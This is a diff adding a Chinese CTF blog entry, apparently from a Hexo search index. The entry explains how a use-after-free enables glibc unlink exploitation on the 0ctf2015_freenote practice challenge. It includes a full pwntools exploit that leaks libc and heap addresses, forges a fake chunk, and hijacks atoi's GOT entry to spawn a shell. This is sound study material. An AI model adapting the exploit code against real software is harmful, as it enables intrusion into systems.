@@ -8485,4 +8485,81 @@
         <tag>urandom</tag>
       </tags>
   </entry>
+  <entry>
+    <title>关于unlink的学习总结</title>
+    <url>/posts/afa5cfa3.html</url>
+    <content><![CDATA[<p>之前对于 <code>unlink</code> 的理解停留在表面，一直以为得有个堆溢出才能利用。今天做了一道 <code>0ctf2015_freenote</code> ，发现利用 <code>UAF</code> ，依然可以打 <code>unlink</code> … 本来记录一下用 <code>UAF</code> 打 <code>unlink</code> 的思路，关于堆溢出打 <code>unlink</code> 以及该手法的更多细节请见 <a href="https://zikh26.github.io/posts/afa5cfa3.html?highlight=unlink">本文</a></p>
+<span id="more"></span>
+
+
+
+<h3 id="UAF-导致的-unlink"><a href="#UAF-导致的-unlink" class="headerlink" title="UAF 导致的 unlink"></a>UAF 导致的 unlink</h3><p><code>unlink</code> 的关键在于两点</p>
+<ol>
+<li>去伪造一个 <code>fake_chunk</code> ，并且要已知 <code>&amp;fake_chunk</code> 的地址</li>
+<li>能够控制 <code>fake_chunk</code> 下面的（高地址方向）合法堆块的 <code>prev_size</code> 和 <code>size</code></li>
+</ol>
+<p>上面提到的合法堆块，也被称为引线堆块。当释放掉引线堆块时，因为引线堆块的 <code>prev_inuse</code> 为 <code>0</code> （需要想办法控制），就会让 <code>ptmalloc</code> 以为引线堆块上面还有一个堆块是处于释放状态，然后要触发合并，通过精心构造的引线堆块 <code>prev_size</code> 找到上一个（低地址方向） <code>fake_chunk</code> ，最终触发 <code>unlink</code></p>
+<p>如果是堆溢出的话，那么很自然 <code>fake_chunk</code> 的构造以及通过溢出来控制引线堆块的 <code>prev_size</code> 和 <code>size</code> 位都轻而易举。下面来看一下只有 <code>UAF</code> 漏洞，如何来做到同样的效果。</p>
+<p>前提：<strong>存在 <code>UAF</code> 漏洞，以 <code>libc 2.23</code> 为例</strong> </p>
+<ol>
+<li>申请 <code>size</code> 为 <code>0x100</code> 堆块 <code>A</code> 和堆块 <code>B</code> （如下图）</li>
+</ol>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021539178.png" alt="image-20230702153901003" style="zoom:67%;" />
+
+<ol start="2">
+<li>现在释放掉 <code>A</code> 和 <code>B</code> ，二者会合并成一个 <code>0x220</code> 的堆块，处于释放状态</li>
+</ol>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021541652.png" alt="image-20230702154135600" style="zoom:50%;" />
+
+
+
+<ol start="3">
+<li><p>将这个 <code>0x220</code> 处于释放状态的堆块申请出来，命名为堆块 <code>C</code> （如下），此时将堆块申请出来后，是可以往里面写入数据的，此时来在原本堆块 <code>A</code> 的位置伪造 <code>fake_chunk</code> ，然后让写入的数据来覆盖掉堆块 <code>B</code> 的 <code>prev_size</code> 和 <code>size</code></p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021545118.png" alt="image-20230702154558066" style="zoom:67%;" />
+</li>
+<li><p>因为存在 <code>UAF</code> 的原因，所以堆块 <code>B</code> 是可以再次被释放的，而它也就被当做了引线堆块。</p>
+</li>
+</ol>
+<p>说到底，其实 <code>UAF</code> 能导致 <code>unlink</code> 的原因实际上是 <code>double free</code> （是位于 <code>unsorted bin</code> 中的堆块两次释放）  至此前戏完成，后面的伪造 <code>fake_chunk</code> 以及触发 <code>unlink</code> 的操作正常进行即可。下面来结合一道题目具体分析一下</p>
+<h3 id="0ctf2015-freenote"><a href="#0ctf2015-freenote" class="headerlink" title="0ctf2015_freenote"></a>0ctf2015_freenote</h3><h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021555241.png" alt="image-20230702155513169" style="zoom: 67%;" />
+
+
+
+<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021557055.png" alt="image-20230702155748014" style="zoom:67%;" />
+
+<p>经典菜单堆，增，删，编辑，打印功能都有。<code>delete</code> 函数中存在 <code>UAF</code> 漏洞</p>
+<p>在 <code>add</code> 功能中，对申请堆块的大小做了要求，必须要为 <code>0x80</code> 字节对齐（下图红框中体现了这一点），这就意味着申请的堆块都无法进入到 <code>fastbin</code> 中</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021559740.png" alt="image-20230702155952680" style="zoom:67%;" />
+
+<p><code>edit</code> 功能中首先限制了堆块自定义的标志位是否为 <code>1</code> ，如果不为1的话，说明该堆块已经被释放了（虽然存在 <code>UAF</code> ，但是自定义标志位确实置空了），如果编辑的 <code>size</code> 不等于原本的值，那么会调用 <code>realloc</code> 扩展或缩小堆块</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021601478.png" alt="image-20230702160146429"></p>
+<p><code>show</code> 函数可以一次直接打印所有堆块里面的数据</p>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>总结一下前面的已知信息</p>
+<ol>
+<li>申请堆块最小为 <code>0x90</code>，也就是堆块无法进入 <code>fastbin</code></li>
+<li>有 <code>UAF</code> ，但是会将自定义标志位置零</li>
+<li><code>show</code> 函数和 <code>edit</code> 函数会检查自定义标志位，但是 <code>delete</code> 函数不会</li>
+<li>可以篡改 <code>got</code> 表，并且没开 <code>PIE</code></li>
+<li>堆块的地址是记录在了初始大堆块中</li>
+</ol>
+<p>所以本题的思路是用 <code>show</code> 函数先泄露出 <code>libc</code> 地址和堆地址（因为检查了自定义标志位，所以要将堆块申请出来，利用里面的残留值进行打印），按照本文最开始说的来布局，利用 <code>uaf</code> 做出 <code>unlink</code> </p>
+<p>图解过程如下：</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021624541.png" alt="image-20230702162401437"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021627938.png" alt="image-20230702162714882"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021625822.png" alt="image-20230702162431475"></p>
+<p>释放引线堆块，触发 <code>unlink</code> ，在记录堆块地址的位置写入了一个 <code>&amp;fake_chunk</code> 的地址</p>
+<p>然后再记录堆块地址的区域写一个 <code>atoi</code> 函数的 <code>got</code> 表地址，最后用 <code>edit</code> 功能篡改 <code>atoi</code> 的 <code>got</code> 表为 <code>system</code> 地址，执行到 <code>atoi(&quot;/bin/sh&quot;)</code> 获取 <code>shell</code></p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_a=<span class="number">0x4010D4</span></span><br><span class="line">d_d=<span class="number">0x4010EC</span></span><br><span class="line">d_e=<span class="number">0x4010e0</span></span><br><span class="line">d_s=<span class="number">0x4010C8</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26132&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length of new note: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Enter your note: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Note number: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length of note: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Enter your note: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Note number: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;q&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;x&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;x&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4c78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;r&#x27;</span>*<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x100</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;prevent1&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">debug(p,d_d,d_a,d_e,d_s,<span class="number">0x400F67</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr=heap_addr-<span class="number">0x1980</span></span><br><span class="line">fake=p64(<span class="number">0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">fake+=p64(target_addr-<span class="number">0x18</span>)+p64(target_addr-<span class="number">0x10</span>)</span><br><span class="line">fake+=p64(<span class="number">0</span>)*<span class="number">28</span></span><br><span class="line">fake+=p64(<span class="number">0x100</span>)+p64(<span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,fake.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x200</span>,p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x10</span>,p64(sys_addr)*<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307021635207.png" alt="image-20230702163540908"></p>
+]]></content>
+      <categories>
+        <category>学习总结</category>
+      </categories>
+      <tags>
+        <tag>篡改got表</tag>
+        <tag>UAF</tag>
+        <tag>unlink</tag>
+      </tags>
+  </entry>
 </search>
